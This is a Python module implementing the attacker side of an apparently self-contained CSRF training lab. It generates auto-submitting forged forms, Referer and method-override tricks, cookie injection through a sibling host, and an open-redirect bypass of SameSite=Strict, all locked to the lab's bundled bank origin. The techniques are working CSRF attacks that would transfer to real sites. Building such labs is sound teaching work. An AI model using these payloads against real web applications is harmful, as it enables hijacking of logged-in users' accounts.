"""The attacker site. It serves forged HTML and shows exactly what it is about to send.

Every attack targets the bundled bank origin only. The builder validates its target
against the lab's own origins, so this cannot be pointed at an arbitrary URL.
"""

from __future__ import annotations

import dataclasses
from html import escape
from urllib.parse import quote, urlencode

from .http_util import Request, Response, html, not_found
from .ui import page, site_bar


@dataclasses.dataclass(frozen=True)
class Attack:
    id: str
    label: str
    description: str
    expectation: str
    # Builds the forged HTML given the lab config and optional query params.
    render: "callable"
    # Appended to the attack's own URL. Some scenarios depend on what the Referer looks
    # like, which means the page has to be *loaded* from a URL containing that text —
    # "{bank}" expands to the bank's hostname when the link is built.
    query: str = ""


def attack_url(req: Request, attack: "Attack") -> str:
    url = f"{req.config.evil_origin}/attack/{attack.id}"
    if attack.query:
        url += "?" + attack.query.format(bank=req.config.bank_host)
    return url


def _bank(req: Request) -> str:
    return req.config.bank_origin


def _uploads(req: Request) -> str:
    return req.config.uploads_origin


def _auto_form(action: str, fields: dict[str, str], method: str = "post", extra_head: str = "") -> str:
    inputs = "".join(
        f'<input type="hidden" name="{escape(name)}" value="{escape(value)}">'
        for name, value in fields.items()
    )
    return f"""<!doctype html><html><head><meta charset="utf-8">{extra_head}</head>
<body onload="document.forms[0].submit()">
<p>If you are reading this, the attack did not auto-submit. Click the button.</p>
<form action="{escape(action)}" method="{escape(method)}">{inputs}
<button type="submit">continue</button></form></body></html>"""


def _nav_html(url: str, extra_head: str = "") -> str:
    return f"""<!doctype html><html><head><meta charset="utf-8">{extra_head}
<meta http-equiv="refresh" content="0;url={escape(url, quote=True)}"></head>
<body><p>Redirecting to <code>{escape(url)}</code> ...</p>
<script>location.href={url!r};</script></body></html>"""


# --------------------------------------------------------------------------------------
# Attack renderers. Each returns the HTML the attacker page serves.
# --------------------------------------------------------------------------------------

ATTACK_EMAIL = "attacker@evil.test"


def r_form_post(req: Request, params: dict) -> str:
    return _auto_form(f"{_bank(req)}/email", {"email": ATTACK_EMAIL})


def r_form_post_wrong_token(req: Request, params: dict) -> str:
    return _auto_form(f"{_bank(req)}/email", {"email": ATTACK_EMAIL, "csrf": "not-the-real-token"})


def r_form_post_omit_token(req: Request, params: dict) -> str:
    # Deliberately no csrf field at all - not an empty one.
    return _auto_form(f"{_bank(req)}/email", {"email": ATTACK_EMAIL})


def r_get_nav(req: Request, params: dict) -> str:
    return _nav_html(f"{_bank(req)}/email?{urlencode({'email': ATTACK_EMAIL})}")


def r_get_nav_blocked(req: Request, params: dict) -> str:
    return _nav_html(f"{_bank(req)}/email?{urlencode({'email': ATTACK_EMAIL})}")


def r_get_nav_method_override(req: Request, params: dict) -> str:
    query = urlencode({"email": ATTACK_EMAIL, "_method": "POST"})
    return _nav_html(f"{_bank(req)}/email?{query}")


def r_pool_token_post(req: Request, params: dict) -> str:
    token = params.get("token", ["PASTE-A-TOKEN"])[0]
    return _auto_form(f"{_bank(req)}/email", {"email": ATTACK_EMAIL, "csrf": token})


def r_form_post_no_referrer(req: Request, params: dict) -> str:
    return _auto_form(
        f"{_bank(req)}/email",
        {"email": ATTACK_EMAIL},
        extra_head='<meta name="referrer" content="no-referrer">',
    )


def r_form_post_loose_referer(req: Request, params: dict) -> str:
    # The attack page's own URL mentions the bank hostname in its query string, and
    # unsafe-url keeps that query string in the Referer sent to the bank.
    return _auto_form(
        f"{_bank(req)}/email",
        {"email": ATTACK_EMAIL},
        extra_head='<meta name="referrer" content="unsafe-url">',
    )


def r_inject_csrf_cookie_then_post(req: Request, params: dict) -> str:
    forged = "attacker-chosen-value"
    # Step 1 sets the csrf cookie via the sibling host, then step 2 posts the matching value.
    set_url = f"{_uploads(req)}/set-cookie?name=csrf&value={quote(forged)}&next="
    submit = _auto_form(f"{_bank(req)}/email", {"email": ATTACK_EMAIL, "csrf": forged})
    return _two_step(req, set_url, submit, forged, "csrf")


def r_inject_csrfkey_cookie_then_post(req: Request, params: dict) -> str:
    key = "attacker-key"
    token = f"token-for-{key}"
    set_url = f"{_uploads(req)}/set-cookie?name=csrfKey&value={quote(key)}&next="
    submit = _auto_form(f"{_bank(req)}/email", {"email": ATTACK_EMAIL, "csrf": token})
    return _two_step(req, set_url, submit, key, "csrfKey")


def _two_step(req: Request, set_url: str, submit_html: str, value: str, cookie_name: str) -> str:
    """Set a cookie via the sibling host in a hidden frame, then submit the forged form."""
    submit_data = "data:text/html;charset=utf-8," + quote(submit_html)
    return f"""<!doctype html><html><head><meta charset="utf-8"></head>
<body>
<p>Step 1: planting <code>{escape(cookie_name)}={escape(value)}</code> from the bank's
sibling host. Step 2: submitting a form whose token matches it.</p>
<iframe style="display:none" src="{escape(set_url)}" onload="go()"></iframe>
<script>
var done=false;
function go(){{
  if(done) return; done=true;
  setTimeout(function(){{ document.getElementById('f').submit(); }}, 400);
}}
</script>
<form id="f" action="{escape(_bank(req) + '/email')}" method="post">
<input type="hidden" name="email" value="{escape(ATTACK_EMAIL)}">
<input type="hidden" name="csrf" value="{escape(value if cookie_name=='csrf' else 'token-for-'+value)}">
</form></body></html>"""


def r_direct_get_strict(req: Request, params: dict) -> str:
    return _nav_html(f"{_bank(req)}/email?{urlencode({'email': ATTACK_EMAIL})}")


def r_server_redirect(req: Request, params: dict) -> str:
    target = quote(f"{_bank(req)}/email?{urlencode({'email': ATTACK_EMAIL})}", safe="")
    return _nav_html(f"{req.config.evil_origin}/redirect?to={target}")


def r_gadget_redirect(req: Request, params: dict) -> str:
    # Send the victim to the sibling host's client-side open-redirect gadget, which then
    # navigates to the bank. The final request is same-site, so Strict cookies ride along.
    bank_url = f"{_bank(req)}/email?{urlencode({'email': ATTACK_EMAIL})}"
    gadget = f"{_uploads(req)}/open-redirect#{quote(bank_url, safe='')}"
    return _nav_html(gadget)


ATTACKS: dict[str, Attack] = {
    a.id: a
    for a in [
        Attack("form_post", "Auto-submit a form POST", "A hidden form to /email that submits itself.", "Succeeds only where the cookie rides along and no token is checked.", r_form_post),
        Attack("form_post_wrong_token", "POST with a wrong token", "Sends csrf=not-the-real-token.", "Rejected wherever the token is actually validated.", r_form_post_wrong_token),
        Attack("form_post_omit_token", "POST with no token field", "The csrf field is absent entirely.", "Succeeds against a check that only validates when the field is present.", r_form_post_omit_token),
        Attack("get_nav", "Top-level GET navigation", "Navigates the tab to /email?email=...", "Carries a Lax cookie because it is a top-level GET.", r_get_nav),
        Attack("get_nav_blocked", "Top-level GET navigation", "Same GET navigation, expected to fail here.", "Blocked once the state-changing GET is removed.", r_get_nav_blocked),
        Attack("get_nav_method_override", "GET carrying _method=POST", "A top-level GET with a method-override parameter.", "Turns into a POST after Lax already allowed the cookie.", r_get_nav_method_override),
        Attack("pool_token_post", "POST with a pooled token", "Uses a token from the ?token= parameter.", "Succeeds where the token is not tied to the session.", r_pool_token_post),
        Attack("form_post_no_referrer", "POST with Referer suppressed", "Uses meta referrer=no-referrer.", "Succeeds against a check that skips when Referer is absent.", r_form_post_no_referrer),
        Attack("form_post_loose_referer", "POST with a misleading Referer", "unsafe-url keeps the bank hostname in the query string.", "Succeeds against a substring Referer match.", r_form_post_loose_referer, query="{bank}"),
        Attack("inject_csrf_cookie_then_post", "Inject csrf cookie, then POST", "Plants a csrf cookie via the sibling host, then submits the same value.", "Defeats a naive double-submit check.", r_inject_csrf_cookie_then_post),
        Attack("inject_csrfkey_cookie_then_post", "Inject csrfKey cookie, then POST", "Plants a csrfKey cookie via the sibling host.", "Defeats a token bound to a non-session cookie.", r_inject_csrfkey_cookie_then_post),
        Attack("direct_get_strict", "Direct cross-site GET", "Navigates straight to the bank.", "Blocked: Strict withholds the cookie on a cross-site navigation.", r_direct_get_strict),
        Attack("server_redirect", "Via a server-side 302", "Bounces through the attacker's own 302.", "Still blocked: the browser remembers the chain began cross-site.", r_server_redirect),
        Attack("gadget_redirect", "Via a same-site client-side redirect", "Bounces through the sibling host's client-side gadget.", "Succeeds even against Strict, because the final request is same-site.", r_gadget_redirect),
    ]
}


def handle(req: Request) -> Response:
    path = req.path
    if path in ("/", "/attack-menu"):
        return menu(req)
    if path.startswith("/attack/"):
        return serve_attack(req, path.split("/attack/", 1)[1])
    if path == "/tweaker":
        return tweaker(req)
    if path == "/tweaker/fire":
        return tweaker_fire(req)
    if path == "/redirect":
        return server_redirect(req)
    if path == "/probe":
        return probe(req)
    return not_found()


def _query(req: Request, attack: Attack) -> str:
    """The ?query an attack page must be loaded with, when it has one."""
    return "?" + attack.query.format(bank=req.config.bank_host) if attack.query else ""


def _bar(req: Request) -> str:
    return site_bar(
        req.config,
        "evil",
        f'<span class="note">Everything here is served by the attacker. '
        f'Target is locked to {escape(req.config.bank_origin)}.</span>'
        f'<a class="btn" href="{escape(req.config.bank_origin)}">Go to the bank</a>',
    )


def menu(req: Request) -> Response:
    rows = "".join(
        f'<tr><td><a class="btn danger" href="/attack/{a.id}{_query(req, a)}">{escape(a.label)}</a></td>'
        f"<td>{escape(a.description)}</td><td class='note'>{escape(a.expectation)}</td></tr>"
        for a in ATTACKS.values()
    )
    body = f"""
<h1>Attacker control panel</h1>
<p class="sub">evil.test. In a real attack this would be any page the victim visits while
logged into the bank.</p>
<div class="warn-box">These launch immediately and navigate your browser to the bank. Make
sure you are logged into the bank in this same browser first, and that the bank is on the
scenario you want to demonstrate.</div>
<div class="panel"><table>
<tr><th>Launch</th><th>What it sends</th><th>Expected</th></tr>{rows}</table></div>
<p><a class="btn primary" href="/tweaker">Open the request tweaker</a></p>
"""
    return html(page("Attacker site", body, site_bar=_bar(req)))


def serve_attack(req: Request, attack_id: str) -> Response:
    attack = ATTACKS.get(attack_id)
    if not attack:
        return not_found()
    forged = attack.render(req, req.query)
    preview = req.q("preview")
    if preview:
        body = f"""
<h1>{escape(attack.label)}</h1>
<p class="sub">{escape(attack.description)}</p>
<div class="panel"><h3>The HTML this page serves</h3><pre>{escape(forged)}</pre></div>
<p><a class="btn danger" href="/attack/{attack_id}">Fire it for real</a></p>
"""
        return html(page(attack.label, body, site_bar=_bar(req)))
    return html(forged.encode())


def server_redirect(req: Request) -> Response:
    from .config import same_origin
    from .http_util import redirect

    to = req.q("to")
    if not same_origin(to, req.config.bank_origin):
        return not_found()
    return redirect(to)


def probe(req: Request) -> Response:
    """Served from evil.test; makes cross-site requests to the bank for the self-check."""
    bank = req.config.bank_origin
    body = f"""<!doctype html><meta charset="utf-8">
<body style="font:12px sans-serif;color:#888;background:#111">cross-site probe (evil)
<script>
fetch({bank!r}+"/self-check/hit?kind=cross-site-fetch", {{credentials:"include",mode:"no-cors"}});
</script>
<form id="p" action="{escape(bank)}/self-check/hit?kind=cross-site-post" method="post" target="s"></form>
<iframe name="s" style="display:none"></iframe>
<script>document.getElementById('p').submit();</script>
</body>"""
    return html(body.encode())


# --------------------------------------------------------------------------------------
# Tweaker
# --------------------------------------------------------------------------------------


def tweaker(req: Request) -> Response:
    config = req.config
    body = f"""
<h1>Request tweaker</h1>
<p class="sub">Change any part of the forged request and fire it at the bank. This is how
you answer "what if we just..." questions live.</p>
<div class="panel">
  <form method="post" action="/tweaker/fire" target="_blank">
    <div class="row">
      <div>
        <label>Method the browser sends</label>
        <select name="method">
          <option>GET</option><option selected>POST</option>
        </select>
      </div>
      <div>
        <label>Delivery</label>
        <select name="delivery">
          <option value="form">Auto-submitted form</option>
          <option value="nav">Top-level navigation</option>
        </select>
      </div>
    </div>
    <label>Target path on the bank</label>
    <input type="text" name="path" value="/email">
    <div class="row">
      <div><label>email parameter</label><input type="text" name="email" value="{escape(ATTACK_EMAIL)}"></div>
      <div>
        <label>csrf parameter</label>
        <select name="csrf_mode">
          <option value="omit">omit entirely</option>
          <option value="wrong">send a wrong value</option>
          <option value="custom">send a custom value (below)</option>
        </select>
      </div>
    </div>
    <label>Custom csrf value</label><input type="text" name="csrf_value" value="">
    <div class="row">
      <div>
        <label>Content-Type (form delivery)</label>
        <select name="content_type">
          <option>application/x-www-form-urlencoded</option>
          <option>text/plain</option>
          <option>multipart/form-data</option>
          <option>application/json</option>
        </select>
      </div>
      <div>
        <label>Referrer-Policy</label>
        <select name="referrer_policy">
          <option value="">browser default</option>
          <option value="no-referrer">no-referrer</option>
          <option value="unsafe-url">unsafe-url</option>
        </select>
      </div>
    </div>
    <label>_method override parameter</label>
    <input type="text" name="method_override" value="" placeholder="e.g. POST">
    <p><button class="btn danger" type="submit">Build and fire</button></p>
  </form>
</div>
<p class="note">The target is always {escape(config.bank_origin)}. Only the path you type is
appended, so this stays a lab tool and not a general-purpose CSRF cannon.</p>
"""
    return html(page("Request tweaker", body, site_bar=_bar(req)))


def tweaker_fire(req: Request) -> Response:
    config = req.config
    path = req.f("path", "/email")
    if not path.startswith("/"):
        path = "/" + path
    action = config.bank_origin + path

    fields: dict[str, str] = {"email": req.f("email", ATTACK_EMAIL)}
    csrf_mode = req.f("csrf_mode", "omit")
    if csrf_mode == "wrong":
        fields["csrf"] = "not-the-real-token"
    elif csrf_mode == "custom":
        fields["csrf"] = req.f("csrf_value", "")
    method_override = req.f("method_override").strip()
    if method_override:
        fields["_method"] = method_override

    referrer_policy = req.f("referrer_policy")
    extra_head = f'<meta name="referrer" content="{escape(referrer_policy)}">' if referrer_policy else ""

    if req.f("delivery") == "nav":
        query = urlencode(fields)
        forged = _nav_html(f"{action}?{query}", extra_head)
    else:
        method = req.f("method", "POST").lower()
        content_type = req.f("content_type", "application/x-www-form-urlencoded")
        enctype = f' enctype="{escape(content_type)}"' if "urlencoded" not in content_type else ""
        inputs = "".join(
            f'<input type="hidden" name="{escape(n)}" value="{escape(v)}">' for n, v in fields.items()
        )
        forged = f"""<!doctype html><html><head><meta charset="utf-8">{extra_head}</head>
<body onload="document.forms[0].submit()">
<form action="{escape(action)}" method="{escape(method)}"{enctype}>{inputs}
<button>go</button></form></body></html>"""

    body = f"""
<h1>Firing your crafted request</h1>
<div class="panel"><h3>The HTML being served</h3><pre>{escape(forged)}</pre></div>
<p class="note">The result opens in this tab momentarily. If it does not, click below.</p>
<div style="opacity:0"><iframe srcdoc="{escape(forged)}" style="width:100%;height:40px;border:0"></iframe></div>
<script>setTimeout(function(){{document.open();document.write({forged!r});document.close();}}, 900);</script>
"""
    return html(page("Tweaker firing", body, site_bar=_bar(req)))
